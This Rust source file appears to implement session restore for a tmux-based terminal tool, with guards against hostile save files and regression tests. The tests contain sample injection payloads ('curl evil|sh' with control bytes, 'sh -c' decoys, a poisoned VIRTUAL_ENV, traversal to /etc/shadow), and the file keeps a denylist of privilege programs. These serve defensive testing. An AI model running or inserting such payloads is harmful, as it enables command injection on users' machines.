//! Restore algorithm: rebuild sessions/windows/panes on the dedicated server,
//! apply verbatim layout strings, replay scrollback and restart safe-listed
//! programs via the `hashterm restore-pane` helper spawned as each pane's
//! command (it streams history to the pty, then exec()s the target).

use crate::schema::*;
use crate::store::{SessionStore, StoreError};
use hashterm_tmux::controller::{
    ACCENT_OPTION, GROUP_COLOR_OPTION, GROUP_OPTION, TITLE_CUSTOM_OPTION, TITLE_OPTION,
};
use hashterm_tmux::{TmuxController, TmuxError, unique_session_name};
use std::path::{Path, PathBuf};

/// Programs never auto-restarted regardless of the user safe-list.
const DENYLIST: &[&str] = &["sudo", "su", "sudoedit", "doas", "passwd", "ssh-add"];

#[derive(Debug, thiserror::Error)]
pub enum RestoreError {
    #[error(transparent)]
    Tmux(#[from] TmuxError),
    #[error(transparent)]
    Store(#[from] StoreError),
    #[error("session '{0}' already exists on the server (conflict policy: skip)")]
    Conflict(String),
}

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum OnConflict {
    Skip,
    /// Restore under a fresh ht-* name (default; the GUI shows titles, not names).
    Rename,
    Replace,
}

#[derive(Debug, Clone)]
pub struct RestoreOptions {
    pub on_conflict: OnConflict,
    /// basenames allowed to auto-restart.
    pub programs: Vec<String>,
    pub restart_arbitrary: bool,
    /// Pre-type (without running) the captured command in panes whose
    /// program was not auto-restarted — browser-style "reload on Enter".
    pub pretype_unrestored: bool,
    /// Shell to exec after replay; None = $SHELL of the restoring process.
    pub shell: Option<String>,
    /// Path to the hashterm binary providing `restore-pane`.
    pub helper: PathBuf,
    /// Resume recipes (TRUSTED user config): program basename -> argv to run
    /// on restore instead of the captured command, so a program resumes its
    /// own persisted state (e.g. claude -> `claude --continue`).
    pub resume: std::collections::HashMap<String, Vec<String>>,
}

#[derive(Debug, Default)]
pub struct RestoreReport {
    /// (saved name, live name) — differs when renamed on conflict.
    pub restored: Vec<(String, String)>,
    pub skipped: Vec<String>,
    /// Human-readable notes (missing cwd, failed layouts, ...).
    pub notes: Vec<String>,
}

/// Restore every session of a save. Returns live session names in saved order.
pub fn restore_save(
    ctl: &TmuxController,
    store: &SessionStore,
    name: &str,
    auto: bool,
    opts: &RestoreOptions,
) -> Result<RestoreReport, RestoreError> {
    let (manifest, dir) = store.load(name, auto)?;
    let mut report = RestoreReport::default();
    let live: Vec<String> = ctl.list_sessions()?.into_iter().map(|s| s.name).collect();

    for session in &manifest.sessions {
        // A hostile save could name a session with tmux target metacharacters
        // (`=`, `*`, `-`, `:`) that would address other live sessions in the
        // kill-session/set-option calls below. Skip anything not our shape.
        if !valid_session_name(&session.name) {
            report
                .notes
                .push(format!("skipped session with invalid name {:?}", session.name));
            continue;
        }
        let target = if live.contains(&session.name) {
            match opts.on_conflict {
                OnConflict::Skip => {
                    report.skipped.push(session.name.clone());
                    continue;
                }
                OnConflict::Rename => unique_session_name(),
                OnConflict::Replace => {
                    ctl.run(&["kill-session", "-t", &session.name])?;
                    session.name.clone()
                }
            }
        } else {
            session.name.clone()
        };
        restore_session(
            ctl,
            session,
            &target,
            &dir,
            manifest.client_size,
            opts,
            &mut report,
        )?;
        report.restored.push((session.name.clone(), target));
    }
    Ok(report)
}

fn restore_session(
    ctl: &TmuxController,
    session: &SessionDump,
    name: &str,
    save_dir: &Path,
    client_size: (u16, u16),
    opts: &RestoreOptions,
    report: &mut RestoreReport,
) -> Result<(), RestoreError> {
    let (cw, ch) = (client_size.0.to_string(), client_size.1.to_string());

    for (wi, window) in session.windows.iter().enumerate() {
        let win_target = format!("{name}:{}", window.index);
        for (pi, pane) in window.panes.iter().enumerate() {
            let cwd = existing_dir(&pane.cwd, report);
            let spawn = spawn_command(pane, save_dir, opts, report);
            if wi == 0 && pi == 0 {
                // Session + first window + first pane in one step, at the
                // original client size so layouts apply cleanly.
                ctl.run(&[
                    "new-session",
                    "-d",
                    "-s",
                    name,
                    "-x",
                    &cw,
                    "-y",
                    &ch,
                    "-c",
                    &cwd,
                    &spawn,
                ])?;
            } else if pi == 0 {
                ctl.run(&["new-window", "-d", "-t", &win_target, "-c", &cwd, &spawn])?;
            } else {
                ctl.run(&["split-window", "-d", "-t", &win_target, "-c", &cwd, &spawn])?;
            }
        }

        if wi == 0 {
            // new-session put the first window at base-index; move if the save
            // used a different index (no-op error if identical is fine).
            let created = format!("{name}:^");
            if ctl
                .run(&["move-window", "-s", &created, "-t", &win_target])
                .is_err()
            {
                // Already at the right index.
            }
        }

        // Verbatim saved layout; its own tmux checksum validates integrity.
        if window.panes.len() > 1
            && let Err(e) = ctl.run(&["select-layout", "-t", &win_target, &window.layout])
        {
            report
                .notes
                .push(format!("layout failed for {win_target}: {e}; kept tiled"));
            let _ = ctl.run(&["select-layout", "-t", &win_target, "tiled"]);
        }

        // Rename after spawn so automatic-rename doesn't clobber it.
        ctl.run(&["rename-window", "-t", &win_target, &window.name])?;

        // Browser-style: stage the captured command at the prompt of panes
        // whose program wasn't auto-restarted. MUST wait for the replay
        // helper to exec() into the shell first — bytes sent during replay
        // are echoed by the pty straight into the middle of the restored
        // scrollback.
        if opts.pretype_unrestored {
            let helper_name = opts
                .helper
                .file_name()
                .map(|s| s.to_string_lossy().into_owned())
                .unwrap_or_else(|| "hashterm".into());
            for pane in &window.panes {
                // Pre-type panes that weren't auto-restarted (servers, venv
                // programs, and unrestored commands) and aren't resume recipes.
                if let Some(fg) = &pane.fg
                    && resume_recipe(fg, opts).is_none()
                    && !wants_exec(fg, opts)
                    && !argv_has_denied(&fg.argv)
                {
                    if !is_safe_pretype(&fg.argv) {
                        report.notes.push(format!(
                            "refused to pre-type command with control characters in pane {}.{}",
                            window.index, pane.index
                        ));
                        continue;
                    }
                    // Re-activate the captured venv/conda env first, if any, so
                    // the pre-typed command resolves the right interpreter.
                    let cmdline = match venv_activation(fg) {
                        Some(activate) => format!("{activate} && {}", shell_join(&fg.argv)),
                        None => shell_join(&fg.argv),
                    };
                    // SECURITY: the activation prefix is built from fg.env
                    // (VIRTUAL_ENV/CONDA_DEFAULT_ENV), which is attacker-
                    // controlled in a hostile save and is NOT covered by the
                    // is_safe_pretype(argv) check above. A control byte there
                    // (Ctrl-U kill-line, CR accept-line) reaching `send-keys -l`
                    // turns "text at the prompt" into "command executed". Re-
                    // check the FULLY COMPOSED line before sending it.
                    if !is_pretype_safe_str(&cmdline) {
                        report.notes.push(format!(
                            "refused to pre-type command with control characters in pane {}.{}",
                            window.index, pane.index
                        ));
                        continue;
                    }
                    let target = format!("{win_target}.{}", pane.index);
                    wait_for_shell(ctl, &target, &helper_name);
                    if let Err(e) = ctl.run(&["send-keys", "-t", &target, "-l", &cmdline]) {
                        report
                            .notes
                            .push(format!("could not pre-type command in {target}: {e}"));
                    } else if is_server(fg) {
                        report.notes.push(format!(
                            "pane {}.{} was a server on port {}; command pre-typed — press Enter to relaunch",
                            window.index,
                            pane.index,
                            fg.listening
                                .iter()
                                .map(|p| p.to_string())
                                .collect::<Vec<_>>()
                                .join(", ")
                        ));
                    }
                }
            }
        }

        // Focus the saved active pane.
        if let Some(active) = window.panes.iter().find(|p| p.active) {
            let _ = ctl.run(&[
                "select-pane",
                "-t",
                &format!("{win_target}.{}", active.index),
            ]);
        }
    }

    // Sanitize the manifest-supplied title (untrusted save): a newline would
    // break list_sessions parsing after restore.
    let title = hashterm_tmux::controller::sanitize_option_value(&session.title);
    ctl.run(&["set-option", "-t", name, TITLE_OPTION, &title])?;
    if session.title_custom {
        ctl.run(&["set-option", "-t", name, TITLE_CUSTOM_OPTION, "1"])?;
    }
    if let Some(accent) = &session.accent {
        ctl.run(&["set-option", "-t", name, ACCENT_OPTION, accent])?;
    }
    // Groups merge by NAME with any live group; on color conflict the next
    // GUI sync self-heals to the first member's color (live wins).
    if let Some(group) = &session.group {
        ctl.run(&["set-option", "-t", name, GROUP_OPTION, group])?;
    }
    if let Some(color) = &session.group_color {
        ctl.run(&["set-option", "-t", name, GROUP_COLOR_OPTION, color])?;
    }
    let _ = ctl.run(&[
        "select-window",
        "-t",
        &format!("{name}:{}", session.active_window),
    ]);
    Ok(())
}

/// Block until the pane's process is no longer the replay helper (scrollback
/// replay finished, shell exec'd), capped at 10s. Replay is normally
/// millisecond-fast; huge scrollbacks take longer.
fn wait_for_shell(ctl: &TmuxController, target: &str, helper_name: &str) {
    for _ in 0..100 {
        match ctl.run(&[
            "display-message",
            "-p",
            "-t",
            target,
            "#{pane_current_command}",
        ]) {
            Ok(cmd) if cmd.trim() != helper_name => return,
            Err(_) => return, // pane gone; send-keys will report it
            _ => std::thread::sleep(std::time::Duration::from_millis(100)),
        }
    }
}

fn existing_dir(cwd: &Path, report: &mut RestoreReport) -> String {
    if cwd.is_dir() {
        cwd.to_string_lossy().into_owned()
    } else {
        report
            .notes
            .push(format!("cwd {} missing; used $HOME", cwd.display()));
        std::env::var("HOME").unwrap_or_else(|_| "/".into())
    }
}

/// The single shell-word command tmux runs in the new pane: our restore-pane
/// helper, which replays scrollback then exec()s the shell or program.
fn spawn_command(
    pane: &PaneDump,
    save_dir: &Path,
    opts: &RestoreOptions,
    report: &mut RestoreReport,
) -> String {
    let mut argv: Vec<String> = vec![
        opts.helper.to_string_lossy().into_owned(),
        "restore-pane".into(),
    ];
    if let Some(sb) = &pane.scrollback {
        match safe_scrollback_path(save_dir, &sb.file) {
            Some(path) => {
                argv.push("--scrollback".into());
                argv.push(path.to_string_lossy().into_owned());
            }
            None => report.notes.push(format!(
                "refused out-of-save scrollback path {:?}; pane restored without history",
                sb.file
            )),
        }
    }
    if let Some(shell) = &opts.shell {
        argv.push("--shell".into());
        argv.push(shell.clone());
    }
    if let Some(fg) = &pane.fg {
        if let Some(recipe) = resume_recipe(fg, opts) {
            // Resume recipe (trusted config): run the user's resume argv in the
            // pane's cwd. --exec-trusted skips the exec allow-list (which guards
            // UNtrusted, save-derived argv, not user config).
            argv.push("--exec-trusted".into());
            argv.extend(recipe.iter().cloned());
        } else if wants_exec(fg, opts) {
            // Auto-restart a safe-listed program with its original argv.
            //
            // SECURITY: we deliberately do NOT auto-append `-S <cwd>/Session.vim`
            // for vim/nvim. Session.vim runs arbitrary Ex commands, and from a
            // save file there is no trustworthy signal that the file is benign:
            // `fg.cwd` is manifest-controlled, so the former `fg.cwd == pane.cwd`
            // guard compared two attacker-supplied fields (a no-op), and any
            // regular file under $HOME (e.g. in a cloned repo) would be sourced.
            // Session-restore is left to vim's own mechanisms.
            argv.push("--exec".into());
            argv.extend(fg.argv.iter().cloned());
        } else if !argv_has_denied(&fg.argv) && !opts.pretype_unrestored {
            // Servers, venv programs and unrestored commands are pre-typed
            // (see restore_session); note only when pre-type is off.
            report.notes.push(format!(
                "'{}' restored as a shell (not auto-restarted)",
                effective_name(fg)
            ));
        }
    }
    shell_join(&argv)
}

/// Basename of a path token, lowercased (denylist/allow-list comparisons).
fn basename_lower(s: &str) -> String {
    Path::new(s)
        .file_name()
        .map(|s| s.to_string_lossy().to_ascii_lowercase())
        .unwrap_or_default()
}

/// A denylisted program appears anywhere in argv (catches `env sudo …`,
/// absolute `/usr/bin/sudo`, wrappers). Compared by basename, case-folded.
fn argv_has_denied(argv: &[String]) -> bool {
    argv.iter()
        .any(|a| DENYLIST.contains(&basename_lower(a).as_str()))
}

/// Peel common wrappers/runners off argv to find the program that actually
/// matters for matching (safe-list / resume recipe), e.g.
/// `uv run jupyter lab` -> "jupyter", `python -m http.server` -> "http.server",
/// `nohup psql …` -> "psql", `env A=b redis-cli` -> "redis-cli". Only the NAME
/// is derived here — the original argv is still what gets run, so the wrapper's
/// own effect (env activation, etc.) is preserved.
fn effective_name(fg: &FgProc) -> String {
    let argv = &fg.argv;
    let mut i = 0;
    while let Some(tok) = argv.get(i) {
        match basename_lower(tok).as_str() {
            // Transparent launchers: skip the wrapper and its own flags.
            "nohup" | "setsid" | "stdbuf" | "time" | "nice" | "ionice" | "doas" | "catchsegv" => {
                i += 1;
                while argv.get(i).is_some_and(|t| t.starts_with('-')) {
                    i += 1;
                }
            }
            // `env [-i] [-u NAME] [-C DIR] [VAR=val ...] cmd`
            "env" => {
                i += 1;
                while let Some(t) = argv.get(i) {
                    if t == "-u" || t == "-C" {
                        i += 2;
                    } else if t.starts_with('-') || t.contains('=') {
                        i += 1;
                    } else {
                        break;
                    }
                }
            }
            // `<runner> run cmd …`
            "uv" | "poetry" | "pdm" | "rye" | "pipenv" | "hatch"
                if argv.get(i + 1).map(String::as_str) == Some("run") =>
            {
                i += 2;
            }
            // `npx [flags] cmd …`
            "npx" | "pnpx" | "bunx" => {
                i += 1;
                while argv.get(i).is_some_and(|t| t.starts_with('-')) {
                    i += 1;
                }
            }
            // `python -m MODULE …` -> the module name.
            "python" | "python3" | "python2"
                if argv.get(i + 1).map(String::as_str) == Some("-m") =>
            {
                return argv
                    .get(i + 2)
                    .map(|m| m.to_ascii_lowercase())
                    .unwrap_or_default();
            }
            // `sh -c "cmd …"` -> the first word of the script.
            "sh" | "bash" | "zsh" | "dash" | "fish"
                if argv.get(i + 1).map(String::as_str) == Some("-c") =>
            {
                return argv
                    .get(i + 2)
                    .and_then(|s| s.split_whitespace().next())
                    .map(basename_lower)
                    .unwrap_or_default();
            }
            _ => break,
        }
    }
    argv.get(i).map(|t| basename_lower(t)).unwrap_or_default()
}

/// Index of the real program after peeling only TRANSPARENT wrappers (env,
/// nohup, `uv run`, npx, …) — the same set `effective_name` peels, but this one
/// never descends into a `-c`/`-m` script. Used to decide authorization.
fn program_head(argv: &[String]) -> usize {
    let mut i = 0;
    while let Some(tok) = argv.get(i) {
        match basename_lower(tok).as_str() {
            "nohup" | "setsid" | "stdbuf" | "time" | "nice" | "ionice" | "doas" | "catchsegv" => {
                i += 1;
                while argv.get(i).is_some_and(|t| t.starts_with('-')) {
                    i += 1;
                }
            }
            "env" => {
                i += 1;
                while let Some(t) = argv.get(i) {
                    if t == "-u" || t == "-C" {
                        i += 2;
                    } else if t.starts_with('-') || t.contains('=') {
                        i += 1;
                    } else {
                        break;
                    }
                }
            }
            "uv" | "poetry" | "pdm" | "rye" | "pipenv" | "hatch"
                if argv.get(i + 1).map(String::as_str) == Some("run") =>
            {
                i += 2;
            }
            "npx" | "pnpx" | "bunx" => {
                i += 1;
                while argv.get(i).is_some_and(|t| t.starts_with('-')) {
                    i += 1;
                }
            }
            _ => break,
        }
    }
    i
}

/// True if — after peeling wrappers — argv invokes an interpreter with an INLINE
/// script/expression/module (`sh -c …`, `python -c/-m …`, `perl -e …`).
///
/// SECURITY: such an argv must never be auto-restarted. `effective_name` derives
/// the safe-list name from the FIRST WORD INSIDE the script (`sh -c "htop; evil"`
/// -> "htop"), but `--exec` runs the WHOLE original argv — so a safe-listed decoy
/// word would authorize an arbitrary payload. These are offered via pre-type
/// (which requires the user to press Enter) instead.
fn carries_inline_script(argv: &[String]) -> bool {
    let i = program_head(argv);
    let Some(head) = argv.get(i).map(|t| basename_lower(t)) else {
        return false;
    };
    let next = argv.get(i + 1).map(String::as_str);
    match head.as_str() {
        "sh" | "bash" | "zsh" | "dash" | "fish" | "ksh" | "csh" | "tcsh" | "ash" => {
            next == Some("-c")
        }
        "python" | "python3" | "python2" | "perl" | "ruby" | "node" | "deno" | "php" | "lua" => {
            matches!(next, Some("-c") | Some("-m") | Some("-e"))
        }
        _ => false,
    }
}

/// Single-quote a value for a shell command (used to build activation prefixes).
fn sh_quote(s: &str) -> String {
    format!("'{}'", s.replace('\'', r"'\''"))
}

/// The command that re-activates the pane's captured venv/conda env, if any.
/// conda takes precedence over a bare VIRTUAL_ENV; a "base" conda env is a
/// no-op and skipped.
fn venv_activation(fg: &FgProc) -> Option<String> {
    let get = |key: &str| {
        fg.env
            .iter()
            .find(|(k, _)| k == key)
            .map(|(_, v)| v.clone())
    };
    if let Some(name) = get("CONDA_DEFAULT_ENV")
        && name != "base"
        && !name.is_empty()
    {
        return Some(format!("conda activate {}", sh_quote(&name)));
    }
    if let Some(venv) = get("VIRTUAL_ENV").filter(|v| !v.is_empty()) {
        return Some(format!("source {}", sh_quote(&format!("{venv}/bin/activate"))));
    }
    None
}

/// A pane that was listening on a TCP port is a server: restore OFFERS it
/// (pre-types the command) rather than silently re-binding the port.
fn is_server(fg: &FgProc) -> bool {
    !fg.listening.is_empty()
}

/// The resume recipe (trusted user config) matching this pane, if any.
fn resume_recipe<'a>(fg: &FgProc, opts: &'a RestoreOptions) -> Option<&'a Vec<String>> {
    if argv_has_denied(&fg.argv) || carries_inline_script(&fg.argv) {
        return None;
    }
    let name = effective_name(fg);
    (!name.is_empty()).then(|| opts.resume.get(&name)).flatten()
}

/// The pane should be auto-restarted with `--exec` (its original argv): a
/// safe-listed program that is neither a server nor tied to a venv (those are
/// offered via pre-type instead, so ports aren't re-bound and the env is right).
fn wants_exec(fg: &FgProc, opts: &RestoreOptions) -> bool {
    !is_server(fg) && venv_activation(fg).is_none() && restartable(fg, opts)
}

fn restartable(fg: &FgProc, opts: &RestoreOptions) -> bool {
    let Some(arg0) = fg.argv.first() else {
        return false;
    };
    // SECURITY: the safe-list/denylist are meaningful only if they gate the
    // program actually exec'd — argv[0] — not the manifest's advisory `name`
    // field (an attacker controls them independently). Require them to agree,
    // then decide on the derived basename, and refuse if ANY argv token is a
    // denylisted program.
    let base = basename_lower(arg0);
    // Integrity: the manifest's advisory name must match the real argv[0].
    if base.is_empty() || fg.name.to_ascii_lowercase() != base {
        return false;
    }
    if argv_has_denied(&fg.argv) {
        return false;
    }
    // SECURITY: never auto-`--exec` an interpreter carrying an inline script;
    // `effective_name` would authorize on a safe-listed decoy word INSIDE the
    // script while the whole (arbitrary) script actually runs. Offer via
    // pre-type instead (requires Enter, and is byte-checked).
    if carries_inline_script(&fg.argv) {
        return false;
    }
    // Membership is tested against the UNWRAPPED program (uv run jupyter ->
    // jupyter), so wrapped invocations match the safe-list too.
    let eff = effective_name(fg);
    opts.restart_arbitrary
        || opts.programs.iter().any(|p| p.eq_ignore_ascii_case(&eff))
}

/// Pre-typing puts these bytes under the shell cursor via `send-keys -l`,
/// below the shell's own parsing. Any control byte (Ctrl-U kill-line, CR
/// accept-line, ESC, …) turns "text sitting at the prompt" into "command
/// executed", so refuse to pre-type argv carrying them.
fn is_safe_pretype(argv: &[String]) -> bool {
    argv.iter().all(|a| is_pretype_safe_str(a))
}

/// A single string is safe to `send-keys -l`: no control byte that the pty line
/// discipline / readline would act on (Ctrl-U kill-line, CR/LF accept-line, ESC).
fn is_pretype_safe_str(s: &str) -> bool {
    s.bytes().all(|b| b >= 0x20 && b != 0x7f)
}

/// Manifest session names reach tmux `-t` targets and `set-option`; tmux
/// target syntax treats `=`, `*`, `-`, `:` specially. Only accept our own
/// `ht-<hex/uuid>` shape so a hostile save can't address arbitrary sessions.
fn valid_session_name(name: &str) -> bool {
    !name.is_empty()
        && name.len() <= 64
        && name
            .bytes()
            .all(|b| b.is_ascii_alphanumeric() || b == b'-' || b == b'_')
}

/// Resolve `sb.file` (manifest-controlled) to a path guaranteed to live
/// inside the save dir: no absolute paths, no `..`/`.` traversal.
fn safe_scrollback_path(save_dir: &Path, file: &Path) -> Option<PathBuf> {
    use std::path::Component;
    if file.components().any(|c| {
        !matches!(c, Component::Normal(_)) // rejects RootDir, ParentDir, CurDir, Prefix
    }) {
        return None;
    }
    let full = save_dir.join(file);
    full.starts_with(save_dir).then_some(full)
}

/// POSIX single-quote each token: safe against spaces, $, quotes, globs.
fn shell_join(argv: &[String]) -> String {
    argv.iter()
        .map(|a| format!("'{}'", a.replace('\'', r"'\''")))
        .collect::<Vec<_>>()
        .join(" ")
}

#[cfg(test)]
mod tests {
    use super::*;

    fn opts() -> RestoreOptions {
        RestoreOptions {
            on_conflict: OnConflict::Rename,
            programs: vec!["htop".into()],
            restart_arbitrary: false,
            pretype_unrestored: false,
            shell: None,
            helper: "/usr/bin/hashterm".into(),
            resume: std::collections::HashMap::new(),
        }
    }

    fn pane(fg: Option<FgProc>) -> PaneDump {
        PaneDump {
            index: 0,
            active: true,
            title: String::new(),
            cwd: "/".into(),
            alternate_on: false,
            in_mode: false,
            fg,
            scrollback: None,
        }
    }

    #[test]
    fn shell_join_quotes_metacharacters() {
        assert_eq!(
            shell_join(&["a b".into(), "it's".into(), "$HOME".into()]),
            r#"'a b' 'it'\''s' '$HOME'"#
        );
    }

    #[test]
    fn denylisted_never_restarts() {
        let fg = FgProc {
            name: "sudo".into(),
            argv: vec!["sudo".into(), "rm".into()],
            cwd: "/".into(),
            env: Vec::new(),
            listening: Vec::new(),
        };
        let mut o = opts();
        o.restart_arbitrary = true;
        assert!(!restartable(&fg, &o));
    }

    #[test]
    fn safelisted_restarts_others_dont() {
        let htop = FgProc {
            name: "htop".into(),
            argv: vec!["htop".into()],
            cwd: "/".into(),
            env: Vec::new(),
            listening: Vec::new(),
        };
        let make = FgProc {
            name: "make".into(),
            argv: vec!["make".into(), "-j8".into()],
            cwd: "/".into(),
            env: Vec::new(),
            listening: Vec::new(),
        };
        assert!(restartable(&htop, &opts()));
        assert!(!restartable(&make, &opts()));
        let mut arbitrary = opts();
        arbitrary.restart_arbitrary = true;
        assert!(restartable(&make, &arbitrary));
    }

    #[test]
    fn spawn_command_includes_exec_for_safelisted() {
        let mut report = RestoreReport::default();
        let p = pane(Some(FgProc {
            name: "htop".into(),
            argv: vec!["htop".into(), "-d".into(), "10".into()],
            cwd: "/".into(),
            env: Vec::new(),
            listening: Vec::new(),
        }));
        let cmd = spawn_command(&p, Path::new("/tmp/save"), &opts(), &mut report);
        assert!(cmd.contains("'--exec' 'htop' '-d' '10'"));
        assert!(cmd.starts_with("'/usr/bin/hashterm' 'restore-pane'"));
    }

    // --- P0 security regressions (#1, #2, #4, #6) ---

    #[test]
    fn name_argv_mismatch_is_not_restartable() {
        // #1: safe-list matches `name`, but argv[0] is a different binary.
        let fg = FgProc {
            name: "htop".into(),
            argv: vec!["/tmp/payload".into()],
            cwd: "/".into(),
            env: Vec::new(),
            listening: Vec::new(),
        };
        let mut o = opts();
        o.programs = vec!["htop".into()];
        assert!(!restartable(&fg, &o));
    }

    #[test]
    fn denylisted_token_anywhere_blocks_restart() {
        // #1: `env sudo …` — env not denied, sudo hides in argv[1].
        let fg = FgProc {
            name: "env".into(),
            argv: vec!["env".into(), "sudo".into(), "sh".into()],
            cwd: "/".into(),
            env: Vec::new(),
            listening: Vec::new(),
        };
        let mut o = opts();
        o.programs = vec!["env".into()];
        assert!(!restartable(&fg, &o));
        // …and absolute-path sudo is caught by basename.
        let fg2 = FgProc {
            name: "ssh".into(),
            argv: vec!["/usr/bin/sudo".into(), "-n".into()],
            cwd: "/".into(),
            env: Vec::new(),
            listening: Vec::new(),
        };
        let mut o2 = opts();
        o2.programs = vec!["ssh".into()];
        assert!(!restartable(&fg2, &o2));
    }

    #[test]
    fn control_bytes_are_not_safe_to_pretype() {
        // #2: Ctrl-U + CR injection shape.
        assert!(!is_safe_pretype(&["\u{15}curl evil|sh\r".into()]));
        assert!(!is_safe_pretype(&["ok".into(), "bad\n".into()]));
        assert!(is_safe_pretype(&["make".into(), "-j8".into()]));
    }

    #[test]
    fn scrollback_path_stays_in_save_dir() {
        // #4: absolute and traversal both refused; a plain name is kept.
        let root = Path::new("/tmp/save");
        assert_eq!(
            safe_scrollback_path(root, Path::new("panes/0.zst")),
            Some(PathBuf::from("/tmp/save/panes/0.zst"))
        );
        assert_eq!(safe_scrollback_path(root, Path::new("/etc/shadow")), None);
        assert_eq!(
            safe_scrollback_path(root, Path::new("../../etc/x.zst")),
            None
        );
    }

    #[test]
    fn resume_recipe_overrides_captured_command() {
        // A configured resume recipe runs its own argv via --exec-trusted,
        // in preference to pre-typing / re-running the captured command.
        let mut o = opts();
        o.resume = [("claude".to_string(), vec![
            "claude".to_string(),
            "--continue".to_string(),
        ])]
        .into_iter()
        .collect();
        let p = pane(Some(FgProc {
            name: "claude".into(),
            argv: vec!["claude".into()],
            cwd: "/home/u/proj".into(),
            env: Vec::new(),
            listening: Vec::new(),
        }));
        let mut report = RestoreReport::default();
        let cmd = spawn_command(&p, Path::new("/tmp/save"), &o, &mut report);
        assert!(cmd.contains("'--exec-trusted' 'claude' '--continue'"), "{cmd}");
        assert!(!cmd.contains("'--exec' "));
    }

    #[test]
    fn session_name_shape_enforced() {
        // #6: tmux target metacharacters rejected.
        assert!(valid_session_name("ht-01a0121f27b69f40"));
        assert!(!valid_session_name("*"));
        assert!(!valid_session_name("a:b"));
        assert!(!valid_session_name("=evil"));
        assert!(!valid_session_name(&"x".repeat(65)));
        assert!(!valid_session_name(""));
    }

    // --- detection features (#1 venv, #2 server, #3 unwrap) ---

    fn fgp(argv: &[&str]) -> FgProc {
        let argv: Vec<String> = argv.iter().map(|s| s.to_string()).collect();
        FgProc {
            name: argv
                .first()
                .map(|a| basename_lower(a))
                .unwrap_or_default(),
            argv,
            cwd: "/".into(),
            env: Vec::new(),
            listening: Vec::new(),
        }
    }

    #[test]
    fn inline_script_runners_are_detected() {
        // #2 crown jewel: an interpreter carrying an inline script/module.
        assert!(carries_inline_script(&fgp(&["sh", "-c", "htop; curl evil|sh"]).argv));
        assert!(carries_inline_script(&fgp(&["bash", "-c", "x"]).argv));
        assert!(carries_inline_script(&fgp(&["python3", "-c", "import os"]).argv));
        assert!(carries_inline_script(&fgp(&["python", "-m", "http.server"]).argv));
        assert!(carries_inline_script(&fgp(&["node", "-e", "x"]).argv));
        // …even hidden behind transparent wrappers.
        assert!(carries_inline_script(&fgp(&["nohup", "sh", "-c", "x"]).argv));
        assert!(carries_inline_script(&fgp(&["env", "A=b", "bash", "-c", "x"]).argv));
        // Real programs and `run`-style wrappers are NOT inline scripts.
        assert!(!carries_inline_script(&fgp(&["htop"]).argv));
        assert!(!carries_inline_script(&fgp(&["uv", "run", "jupyter", "lab"]).argv));
        assert!(!carries_inline_script(&fgp(&["python"]).argv)); // bare REPL
    }

    #[test]
    fn sh_c_decoy_is_not_auto_restarted() {
        // #2: `sh -c "htop; evil"` — effective_name says "htop" (safe-listed),
        // but the whole script would run via --exec. Must NOT be restartable.
        let mut o = opts();
        o.programs = vec!["htop".into(), "sh".into()]; // even if sh is listed
        // Space after the decoy so the first script word is exactly "htop".
        let fg = fgp(&["sh", "-c", "htop -d 1; curl evil | sh"]);
        assert_eq!(effective_name(&fg), "htop"); // the decoy the old check trusted
        assert!(!restartable(&fg, &o));
        assert!(!wants_exec(&fg, &o));
        // and it is not smuggled into a resume recipe either.
        o.resume = [("htop".into(), vec!["htop".into()])].into_iter().collect();
        assert!(resume_recipe(&fg, &o).is_none());
    }

    #[test]
    fn venv_control_bytes_fail_the_composed_pretype_check() {
        // #1: a poisoned VIRTUAL_ENV yields an activation prefix that the
        // argv-only is_safe_pretype misses but the composed-string check catches.
        let mut fg = fgp(&["ipython"]);
        assert!(is_safe_pretype(&fg.argv)); // argv alone looks clean
        fg.env = vec![("VIRTUAL_ENV".into(), "\u{15}curl evil|sh\r#".into())];
        let activate = venv_activation(&fg).unwrap();
        let cmdline = format!("{activate} && {}", shell_join(&fg.argv));
        assert!(!is_pretype_safe_str(&cmdline)); // the guard that now runs
    }

    #[test]
    fn effective_name_unwraps_runners() {
        assert_eq!(effective_name(&fgp(&["uv", "run", "jupyter", "lab"])), "jupyter");
        assert_eq!(effective_name(&fgp(&["poetry", "run", "ipython"])), "ipython");
        assert_eq!(effective_name(&fgp(&["nohup", "psql", "-h", "db"])), "psql");
        assert_eq!(effective_name(&fgp(&["env", "A=b", "redis-cli"])), "redis-cli");
        assert_eq!(effective_name(&fgp(&["python", "-m", "http.server"])), "http.server");
        assert_eq!(effective_name(&fgp(&["sh", "-c", "flask run --port 5000"])), "flask");
        assert_eq!(effective_name(&fgp(&["/usr/bin/htop"])), "htop");
    }

    #[test]
    fn wrapped_program_matches_safelist_and_recipe() {
        // uv run jupyter -> jupyter is safe-listed -> restartable.
        let mut o = opts();
        o.programs = vec!["jupyter".into()];
        assert!(restartable(&fgp(&["uv", "run", "jupyter", "lab"]), &o));
        // uv run claude -> matches the claude resume recipe (by unwrapped name).
        o.resume = [("claude".into(), vec!["claude".into(), "--continue".into()])]
            .into_iter()
            .collect();
        assert!(resume_recipe(&fgp(&["uv", "run", "claude"]), &o).is_some());
    }

    #[test]
    fn venv_activation_built_from_env() {
        let mut fg = fgp(&["ipython"]);
        fg.env = vec![("VIRTUAL_ENV".into(), "/home/u/proj/.venv".into())];
        assert_eq!(
            venv_activation(&fg).as_deref(),
            Some("source '/home/u/proj/.venv/bin/activate'")
        );
        fg.env = vec![("CONDA_DEFAULT_ENV".into(), "ml".into())];
        assert_eq!(venv_activation(&fg).as_deref(), Some("conda activate 'ml'"));
        // conda "base" is a no-op.
        fg.env = vec![("CONDA_DEFAULT_ENV".into(), "base".into())];
        assert_eq!(venv_activation(&fg), None);
    }

    #[test]
    fn server_and_venv_are_offered_not_auto_restarted() {
        let mut o = opts();
        o.programs = vec!["jupyter".into(), "ipython".into()];
        // a listening jupyter is a server -> not auto-exec (offered instead).
        let mut server = fgp(&["jupyter", "lab"]);
        server.listening = vec![8888];
        assert!(is_server(&server));
        assert!(!wants_exec(&server, &o));
        // a venv ipython -> not auto-exec (pre-typed with activation instead).
        let mut venv = fgp(&["ipython"]);
        venv.env = vec![("VIRTUAL_ENV".into(), "/home/u/.venv".into())];
        assert!(!wants_exec(&venv, &o));
        // a plain safe-listed program still auto-execs.
        assert!(wants_exec(&fgp(&["ipython"]), &o));
    }
}
